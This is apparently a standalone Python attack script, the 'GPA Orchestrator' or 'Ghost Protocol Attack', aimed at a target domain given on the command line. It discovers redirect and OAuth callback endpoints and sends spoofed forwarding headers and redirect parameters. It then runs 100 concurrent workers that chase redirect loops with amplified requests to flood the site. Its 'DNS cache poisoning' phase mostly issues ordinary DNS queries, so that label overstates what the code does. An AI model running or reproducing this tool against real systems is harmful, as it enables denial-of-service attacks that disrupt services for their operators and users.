#!/usr/bin/env python3
"""
EL CIENCO - GPA ORCHESTRATOR
Advanced payload generation and loop chain management
"""

import asyncio
import aiohttp
import aiodns
import random
import time
import json
import sys
from urllib.parse import urlparse, urljoin, urlencode
from typing import List, Dict, Optional
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
import threading

@dataclass
class GPAConfig:
    target: str
    duration: int = 120
    workers: int = 100
    dns_resolvers: List[str] = field(default_factory=lambda: ["8.8.8.8", "1.1.1.1", "9.9.9.9"])
    cache_poison: bool = True
    loop_depth: int = 5
    verbose: bool = True

class GPAOrchestrator:
    def __init__(self, config: GPAConfig):
        self.config = config
        self.stats = {
            "requests": 0,
            "loops": 0,
            "amplification": 0,
            "active_loops": 0,
            "dns_poisoned": 0
        }
        self.lock = threading.Lock()
        self.running = False
        
        # DNS Resolver
        self.resolver = aiodns.DNSResolver(nameservers=config.dns_resolvers)
        
        # Loop chains yang terdeteksi
        self.loop_chains = []
        self.discovered_endpoints = set()
        
    def log(self, message: str, level: str = "INFO"):
        if self.config.verbose:
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {message}")
    
    async def discover_redirect_endpoints(self) -> List[str]:
        """Discover all redirect-capable endpoints"""
        self.log("Phase 0: Discovering redirect endpoints...")
        
        common_paths = [
            "/callback", "/oauth/callback", "/auth/callback",
            "/redirect", "/r", "/go", "/out", "/external",
            "/api/redirect", "/api/callback", "/webhook",
            "/payment/callback", "/payment/return", "/return",
            "/next", "/continue", "/login/redirect", "/logout",
            "/signin/callback", "/connect/callback", "/authorize",
        ]
        
        discovered = []
        
        async with aiohttp.ClientSession() as session:
            for path in common_paths:
                url = f"https://{self.config.target}{path}"
                try:
                    async with session.get(
                        url, 
                        allow_redirects=False,
                        timeout=aiohttp.ClientTimeout(total=3),
                        ssl=False
                    ) as response:
                        if response.status in [301, 302, 303, 307, 308]:
                            location = response.headers.get("Location", "")
                            if location:
                                discovered.append({
                                    "path": path,
                                    "status": response.status,
                                    "location": location,
                                    "method": "GET"
                                })
                                self.discovered_endpoints.add(path)
                                self.log(f"Discovered: {path} -> {location[:50]}...")
                except:
                    pass
        
        # Post endpoints
        post_paths = ["/login", "/auth", "/signin", "/api/auth", "/oauth/token"]
        for path in post_paths:
            url = f"https://{self.config.target}{path}"
            try:
                async with session.post(
                    url,
                    data={"redirect_uri": f"https://{self.config.target}/callback"},
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=3),
                    ssl=False
                ) as response:
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        if location:
                            discovered.append({
                                "path": path,
                                "status": response.status,
                                "location": location,
                                "method": "POST",
                                "data": {"redirect_uri": f"https://{self.config.target}/callback"}
                            })
                            self.discovered_endpoints.add(path)
            except:
                pass
        
        self.log(f"Discovered {len(discovered)} redirect endpoints")
        return discovered
    
    async def poison_dns_cache(self):
        """Advanced DNS cache poisoning with multiple techniques"""
        self.log("Phase 1: DNS Cache Poisoning...")
        
        subdomain_templates = [
            "api", "cdn", "static", "media", "assets", "img", "css", "js",
            "www{}", "mail", "smtp", "pop", "ftp", "secure", "vpn",
            "admin", "portal", "dashboard", "app", "mobile", "m",
            "cache{}", "proxy{}", "edge{}", "origin{}"
        ]
        
        async def poison_single(subdomain: str):
            try:
                full_domain = f"{subdomain}.{self.config.target}"
                
                # Multiple DNS query types
                for qtype in ['A', 'AAAA', 'CNAME']:
                    try:
                        await self.resolver.query(full_domain, qtype)
                        with self.lock:
                            self.stats["dns_poisoned"] += 1
                    except:
                        pass
                
                # HTTP warmup untuk memicu DNS resolution di layer aplikasi
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(
                            f"http://{full_domain}/",
                            timeout=aiohttp.ClientTimeout(total=2),
                            ssl=False,
                            headers={"Host": self.config.target}
                        ):
                            pass
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        tasks = []
        for i in range(100):
            template = random.choice(subdomain_templates)
            if "{}" in template:
                template = template.format(random.randint(1, 999))
            tasks.append(poison_single(template))
        
        # Run in batches
        batch_size = 50
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            await asyncio.gather(*batch)
            await asyncio.sleep(0.01)
        
        self.log(f"DNS Poisoned: {self.stats['dns_poisoned']} records")
    
    async def generate_loop_payload(self, endpoint: Dict) -> Dict:
        """Generate malicious payload for loop creation"""
        payload = {
            "url": f"https://{self.config.target}{endpoint['path']}",
            "method": endpoint.get("method", "GET"),
            "headers": {
                "X-Forwarded-Host": f"poison-{random.randint(1000,9999)}.ghost.elcienco",
                "X-Original-URL": endpoint['path'],
                "X-Rewrite-URL": "/",
                "X-Forwarded-Proto": "https",
                "Forwarded": f"host=poison-{random.randint(1000,9999)}.ghost.elcienco;proto=https",
                "Referer": f"https://{random.choice(self.config.dns_resolvers)}/",
                "Origin": f"https://cache{random.randint(1,99)}.ghost.elcienco",
                "User-Agent": "GPA-Orchestrator/2310",
                "Accept": "*/*",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
            },
            "params": {}
        }
        
        # Tambahkan parameter redirect
        redirect_params = {
            "redirect_uri": f"https://{self.config.target}{endpoint['path']}",
            "return_url": endpoint['path'],
            "next": endpoint['path'],
            "callback": f"https://{self.config.target}{endpoint['path']}",
            "redirect": endpoint['path'],
            "goto": endpoint['path'],
            "dest": endpoint['path'],
            "return": endpoint['path'],
            "from": endpoint['path'],
            "ref": endpoint['path'],
            "redirect_to": f"https://{self.config.target}{endpoint['path']}",
            "continue": endpoint['path'],
            "fallback": endpoint['path'],
        }
        
        payload["params"] = redirect_params
        
        if endpoint.get("data"):
            payload["data"] = endpoint["data"]
        
        return payload
    
    async def trigger_loop_chain(self, session: aiohttp.ClientSession, 
                                  payloads: List[Dict], depth: int = 0):
        """Create self-sustaining loop chain"""
        if depth > self.config.loop_depth:
            return
        
        for payload in payloads:
            try:
                url = payload["url"]
                if payload.get("params"):
                    url += "?" + urlencode(payload["params"])
                
                async with session.request(
                    method=payload["method"],
                    url=url,
                    headers=payload["headers"],
                    data=payload.get("data"),
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=3),
                    ssl=False
                ) as response:
                    
                    with self.lock:
                        self.stats["requests"] += 1
                    
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        
                        if location and self.config.target in location:
                            with self.lock:
                                self.stats["loops"] += 1
                                self.stats["active_loops"] += 1
                            
                            # Amplify - trigger multiple sub-requests
                            amplify_tasks = []
                            for _ in range(5):
                                amplify_tasks.append(
                                    self.amplify_request(session, location, payload["headers"])
                                )
                            
                            await asyncio.gather(*amplify_tasks)
                            
                            # Recursive loop
                            new_payload = payload.copy()
                            new_payload["url"] = location
                            await self.trigger_loop_chain(session, [new_payload], depth + 1)
                            
            except Exception as e:
                pass
    
    async def amplify_request(self, session: aiohttp.ClientSession, 
                              location: str, headers: Dict):
        """Amplify the attack with multiple parallel requests"""
        try:
            tasks = []
            for i in range(3):
                modified_headers = headers.copy()
                modified_headers["X-Amplification"] = str(i)
                modified_headers["X-Loop-Count"] = str(self.stats["loops"])
                
                task = session.get(
                    location,
                    headers=modified_headers,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=2),
                    ssl=False
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            with self.lock:
                for r in results:
                    if not isinstance(r, Exception):
                        self.stats["amplification"] += 1
                        
        except Exception:
            pass
    
    async def attack_worker(self, worker_id: int, payloads: List[Dict]):
        """Worker coroutine for sustained attack"""
        end_time = time.time() + self.config.duration
        
        connector = aiohttp.TCPConnector(
            limit=0,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            while time.time() < end_time and self.running:
                # Select random payloads
                selected = random.sample(payloads, min(3, len(payloads)))
                await self.trigger_loop_chain(session, selected)
                await asyncio.sleep(0.001)  # Minimal delay
    
    async def monitor(self):
        """Real-time attack monitoring"""
        start_time = time.time()
        
        print("\n" + "="*70)
        print(f"GPA ORCHESTRATOR - Target: {self.config.target}")
        print(f"Workers: {self.config.workers} | Duration: {self.config.duration}s")
        print("="*70 + "\n")
        
        while self.running:
            elapsed = time.time() - start_time
            
            if elapsed >= self.config.duration:
                break
            
            with self.lock:
                req = self.stats["requests"]
                loops = self.stats["loops"]
                amp = self.stats["amplification"]
                active = self.stats["active_loops"]
                poisoned = self.stats["dns_poisoned"]
            
            amp_factor = amp / max(1, req)
            
            # Progress bar
            progress = int((elapsed / self.config.duration) * 50)
            bar = "█" * progress + "░" * (50 - progress)
            
            print(f"\r[{bar}] {int(elapsed)}s | Req: {req} | Loops: {loops} | "
                  f"Amp: {amp_factor:.2f}x | Active: {active} | DNS: {poisoned}", end="")
            
            await asyncio.sleep(1)
        
        print("\n")
    
    async def run(self):
        """Main execution flow"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║     EL CIENCO - GHOST PROTOCOL ATTACK ORCHESTRATOR               ║
║     Advanced DNS Poisoning + Infinite Redirect Loop              ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
        self.running = True
        
        # Phase 1: Discover endpoints
        endpoints = await self.discover_redirect_endpoints()
        
        if not endpoints:
            self.log("No redirect endpoints found. Using default paths.", "WARN")
            endpoints = [{"path": p, "method": "GET"} for p in [
                "/callback", "/redirect", "/return", "/next"
            ]]
        
        # Phase 2: DNS Poisoning
        if self.config.cache_poison:
            await self.poison_dns_cache()
        
        # Phase 3: Generate payloads
        payloads = []
        for endpoint in endpoints:
            payload = await self.generate_loop_payload(endpoint)
            payloads.append(payload)
        
        self.log(f"Generated {len(payloads)} attack payloads")
        
        # Phase 4: Launch attack
        self.log(f"Launching {self.config.workers} workers...")
        
        monitor_task = asyncio.create_task(self.monitor())
        
        workers = []
        for i in range(self.config.workers):
            worker = asyncio.create_task(self.attack_worker(i, payloads))
            workers.append(worker)
            await asyncio.sleep(0.01)
        
        # Wait for duration
        await asyncio.sleep(self.config.duration)
        self.running = False
        
        # Cleanup
        for w in workers:
            w.cancel()
        
        await monitor_task
        
        # Final report
        print("\n" + "="*70)
        print("GPA ATTACK COMPLETED")
        print(f"  Total Requests:      {self.stats['requests']}")
        print(f"  Total Loops Created: {self.stats['loops']}")
        print(f"  Amplification:       {self.stats['amplification']}")
        amp_factor = self.stats['amplification'] / max(1, self.stats['requests'])
        print(f"  Amplification Ratio: {amp_factor:.2f}x")
        print(f"  DNS Records Poisoned: {self.stats['dns_poisoned']}")
        print(f"  Endpoints Exploited: {len(self.discovered_endpoints)}")
        print("="*70)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="GPA Orchestrator - Ghost Protocol Attack")
    parser.add_argument("-t", "--target", required=True, help="Target domain")
    parser.add_argument("-d", "--duration", type=int, default=120, help="Duration in seconds")
    parser.add_argument("-w", "--workers", type=int, default=100, help="Number of workers")
    parser.add_argument("-r", "--resolvers", default="8.8.8.8,1.1.1.1,9.9.9.9", 
                       help="DNS resolvers (comma-separated)")
    parser.add_argument("--no-poison", action="store_true", help="Disable DNS poisoning")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    config = GPAConfig(
        target=args.target,
        duration=args.duration,
        workers=args.workers,
        dns_resolvers=args.resolvers.split(","),
        cache_poison=not args.no_poison,
        verbose=args.verbose
    )
    
    orchestrator = GPAOrchestrator(config)
    
    try:
        asyncio.run(orchestrator.run())
    except KeyboardInterrupt:
        print("\n[GPA] Attack interrupted by user")
    except Exception as e:
        print(f"\n[ERROR] {e}")

if __name__ == "__main__":
    main()
